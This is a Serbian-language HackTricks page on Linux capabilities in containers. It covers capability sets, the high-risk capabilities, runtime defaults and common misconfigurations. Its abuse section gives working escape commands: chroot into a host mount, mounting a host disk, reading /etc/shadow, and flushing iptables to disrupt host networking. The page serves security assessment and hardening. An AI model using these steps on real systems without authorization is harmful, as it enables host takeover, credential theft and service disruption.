# Linux kapaciteti u kontejnerima

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

Linux capabilities su jedan od najvažnijih delova bezbednosti kontejnera jer odgovaraju na suptilno ali fundamentalno pitanje: **šta zapravo znači "root" unutar kontejnera?** Na normalnom Linux sistemu, UID 0 je istorijski podrazumevao veoma širok skup privilegija. U modernim kernelima ta privilegija je razložena u manje jedinice zvane capabilities. Proces može biti pokrenut kao root i ipak mu nedostaju mnoge moćne operacije ako su relevantne capabilities uklonjene.

Kontejneri se u velikoj meri oslanjaju na ovu distinkciju. Mnogi workloads se i dalje pokreću kao UID 0 unutar kontejnera iz razloga kompatibilnosti ili jednostavnosti. Bez capability dropping to bi bilo previše opasno. Sa capability dropping, containerized root proces i dalje može obavljati mnoge obične zadatke unutar kontejnera dok mu se uskraćuju osetljivije kernel operacije. Zato container shell koji kaže `uid=0(root)` ne znači automatski "host root" ili čak "široke kernel privilegije". Capability setovi odlučuju koliko ta root identitet zapravo vredi.

Za kompletnu Linux capability referencu i mnoge primere zloupotrebe, vidi:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Operacija

Capabilities se prate u nekoliko setova, uključujući permitted, effective, inheritable, ambient, i bounding setove. Za mnoge procene kontejnera, tačna kernel semantika svakog seta je manje odmah važna od krajnjeg praktičnog pitanja: **koje privilegovane operacije ovaj proces može uspešno izvršiti sada, i koja buduća dobijanja privilegija su još moguća?**

Razlog zašto je ovo važno je što su mnoge breakout tehnike ustvari capability problemi prikriveni kao container problemi. Workload sa `CAP_SYS_ADMIN` može dostići ogroman deo kernel funkcionalnosti koju normalan container root proces ne bi trebalo da dira. Workload sa `CAP_NET_ADMIN` postaje mnogo opasniji ako takođe deli host network namespace. Workload sa `CAP_SYS_PTRACE` postaje mnogo interesantniji ako može videti host procese kroz host PID sharing. U Docker ili Podman to se može pojaviti kao `--pid=host`; u Kubernetes to obično izgleda kao `hostPID: true`.

Drugim rečima, capability set ne može biti evaluiran izolovano. Mora se čitati zajedno sa namespaces, seccomp, i MAC policy.

## Lab

Vrlo direktan način da se inspekcija capabilities unutar kontejnera izvrši je:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Takođe možete uporediti više ograničen container sa onim kojem su dodate sve capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Da biste videli efekat uskog dodatka, pokušajte da uklonite sve i ponovo dodate samo jednu capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ovi mali eksperimenti pomažu da se pokaže da runtime ne samo prebacuje boolean nazvan "privileged". On oblikuje stvarnu površinu privilegija dostupnu procesu.

## Visoko rizične capabilities

**`CAP_SYS_ADMIN`** je ona prema kojoj bi odbrambeni timovi trebalo da budu najoprezniji. Često se opisuje kao "the new root" jer otključava ogroman broj funkcionalnosti, uključujući operacije vezane za mount, ponašanje osetljivo na namespace i mnoge kernel putanje koje ne bi trebalo olako izlagati kontejnerima. Ako kontejner ima `CAP_SYS_ADMIN`, slab seccomp i nema snažno MAC ograničenje, mnogi klasični putevi za bekstvo postaju mnogo realističniji.

**`CAP_SYS_PTRACE`** je važan kada postoji vidljivost procesa, posebno ako je PID namespace deljen sa hostom ili sa interesantnim susednim workload-ovima. Može pretvoriti vidljivost u manipulisanje.

**`CAP_NET_ADMIN`** i **`CAP_NET_RAW`** su značajni u mrežno orijentisanim okruženjima. Na izolovanoj bridge mreži već mogu biti rizični; u deljenom host network namespace-u su mnogo gori jer workload može rekonfigurisati host mrežu, sniff, spoof ili ometati lokalne tokove saobraćaja.

**`CAP_SYS_MODULE`** je obično katastrofalan u rootful okruženju zato što učitavanje kernel modula efektivno znači kontrolu nad host kernelom. Skoro nikada ne bi trebalo da se pojavljuje u general-purpose container workload-u.

## Korišćenje runtime-a

Docker, Podman, stackovi zasnovani na containerd i CRI-O svi koriste kontrole capability-ja, ali podrazumevana podešavanja i interfejsi za upravljanje se razlikuju. Docker ih izlaže veoma direktno kroz flagove kao što su `--cap-drop` i `--cap-add`. Podman izlaže slične kontrole i često ima koristi od rootless izvršavanja kao dodatnog sloja bezbednosti. Kubernetes izlaže dodavanja i uklanjanja capability-ja kroz Pod ili container `securityContext`. System-container okruženja kao što su LXC/Incus takođe se oslanjaju na kontrolu capability-ja, ali šira integracija sa hostom u tim sistemima često navodi operatore da opuštaju podrazumevana podešavanja agresivnije nego što bi to uradili u app-container okruženju.

Isti princip važi za sve: capability koja je tehnički moguće dodeliti nije nužno i ona koja bi trebalo da bude dodeljena. Mnogi realni incidenti počinju kada operator doda capability jednostavno zato što workload nije radio pod strožom konfiguracijom i tim je želeo brzo rešenje.

## Pogrešne konfiguracije

Najočitija greška je **`--cap-add=ALL`** u CLI-jevima tipa Docker/Podman, ali to nije jedina. U praksi je češći problem dodeljivanje jedne ili dve izuzetno moćne capability, posebno `CAP_SYS_ADMIN`, da bi "aplikacija radila" bez razumevanja implikacija na namespace, seccomp i mount. Drugi čest način greške je kombinovanje dodatnih capability-ja sa deljenjem host namespace-a. U Docker-u ili Podman-u to se može pojaviti kao `--pid=host`, `--network=host`, ili `--userns=host`; u Kubernetes-u ekvivalentna izloženost obično se pojavljuje kroz podešavanja workload-a kao što su `hostPID: true` ili `hostNetwork: true`. Svaka od tih kombinacija menja šta capability zaista može uticati.

Takođe je često da administratori veruju da zato što workload nije u potpunosti `--privileged`, on je i dalje značajno ograničen. Ponekad je to tačno, ali ponekad je efektivno stanje već dovoljno blizu privilegovanom da razlika prestane da bude bitna u operativnom smislu.

## Zloupotreba

Prvi praktičan korak je da se izlista efektivan skup capability-ja i odmah testiraju capability-specifične akcije koje bi bile važne za bekstvo ili pristup informacijama hosta:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Ako je prisutan `CAP_SYS_ADMIN`, prvo testirajte mount-based abuse i host filesystem access, jer je ovo jedan od najčešćih breakout enablers:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Ako je prisutan `CAP_SYS_PTRACE` i kontejner može da vidi interesantne procese, proverite da li se taj capability može iskoristiti za inspekciju procesa:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Ako je prisutan `CAP_NET_ADMIN` ili `CAP_NET_RAW`, testirajte da li workload može manipulisati vidljivim mrežnim stekom ili bar prikupiti korisne mrežne informacije:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Kada test capability-a uspe, kombinujte ga sa stanjem namespace-a. Capability koja u izolovanom namespace-u deluje tek rizično može odmah postati escape ili host-recon primitive kada kontejner takođe deli host PID, host network ili host mounts.

### Potpun primer: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Ako kontejner ima `CAP_SYS_ADMIN` i upisiv bind mount host fajl sistema, kao što je `/host`, put do escape-a je često jednostavan:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Ako `chroot` uspe, komande se sada izvršavaju u kontekstu root fajl sistema hosta:
```bash
id
hostname
cat /etc/shadow | head
```
Ako `chroot` nije dostupan, isti rezultat se često može postići pozivanjem binarne datoteke kroz montirano stablo:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Kompletan primer: `CAP_SYS_ADMIN` + pristup uređaju

Ako je blok uređaj sa hosta izložen, `CAP_SYS_ADMIN` može ga pretvoriti u direktan pristup datotečnom sistemu hosta:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Potpun primer: `CAP_NET_ADMIN` + Host Networking

Ova kombinacija ne dovodi uvek direktno do host root, ali može u potpunosti rekonfigurisati mrežni stack hosta:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
To može omogućiti denial of service, traffic interception, ili pristup servisima koji su ranije bili filtrirani.

## Checks

Cilj capability checks nije samo da dump raw values, već da se razume da li proces ima dovoljno privilegija da njegovo trenutno namespace i mount stanje učini opasnim.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Zanimljivo ovde:

- `capsh --print` je najlakši način da uočite visokorizične capabilities kao što su `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, ili `cap_sys_module`.
- Linija `CapEff` u `/proc/self/status` pokazuje šta je zapravo efektivno sada, a ne samo šta bi moglo biti dostupno u drugim setovima.
- capability dump postaje mnogo važniji ako container takođe deli host PID, network, ili user namespaces, ili ima writable host mounts.

Nakon prikupljanja sirovih informacija o capabilities, sledeći korak je interpretacija. Zapitajte se da li je proces root, da li su user namespaces aktivni, da li su host namespaces deljeni, da li seccomp primenjuje/je enforcing, i da li AppArmor ili SELinux i dalje ograničavaju proces. Capability set sam po sebi je samo deo priče, ali često je deo koji objašnjava zašto jedan container breakout radi, a drugi ne sa istom prividnom polaznom tačkom.

## Podrazumevana podešavanja

| Runtime / platform | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano smanjen set capabilities | Docker zadržava podrazumevanu allowlistu capabilities i uklanja ostale | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Podrazumevano smanjen set capabilities | Podman containeri su po defaultu unprivileged i koriste smanjeni capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Nasleđuje runtime podrazumevana osim ako nije promenjeno | Ako `securityContext.capabilities` nisu navedene, container dobija podrazumevani capability set iz runtime-a | `securityContext.capabilities.add`, failing to `drop: ["ALL"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Obično runtime podrazumevano | Efektivni set zavisi od runtime-a plus Pod spec | isto kao i red u Kubernetesu; direktna OCI/CRI konfiguracija takođe može eksplicitno dodati capabilities |

Za Kubernetes, važna poenta je da API ne definiše jedinstveni univerzalni podrazumevani capability set. Ako Pod ne doda ili ne ukloni capabilities, workload nasleđuje runtime podrazumevano za taj čvor.
